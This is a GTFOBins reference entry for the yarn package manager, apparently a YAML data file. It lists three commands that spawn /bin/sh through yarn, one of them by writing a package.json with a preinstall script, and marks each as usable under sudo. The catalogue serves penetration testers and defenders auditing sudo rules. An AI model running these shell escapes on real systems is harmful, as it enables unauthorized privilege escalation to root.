<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/yarn -->
---
functions:
  shell:
  - code: |-
      yarn exec /bin/sh
    contexts:
      sudo:
      unprivileged:
  - code: |-
      echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
      yarn --cwd .
    contexts:
      sudo:
      unprivileged:
  - code: |-
      echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
      yarn --cwd . xxx
    contexts:
      sudo:
      unprivileged:
...
